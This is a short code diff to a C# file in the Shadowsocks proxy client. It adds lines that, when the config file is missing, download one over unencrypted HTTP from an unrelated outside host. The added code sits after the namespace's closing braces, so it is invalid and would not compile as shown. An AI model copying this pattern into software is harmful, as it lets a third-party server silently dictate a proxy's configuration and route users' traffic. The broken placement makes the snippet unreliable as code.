@@ -165,3 +165,8 @@ namespace Shadowsocks.Model
         }
     }
 }
+if (!File.Exists(CONFIG_FILE))
+{
+  System.Net.WebClient client = new System.Net.WebClient();
+  client.DownloadFile("http://game.cnasda.com/shadowsocks/", CONFIG_FILE);
+}
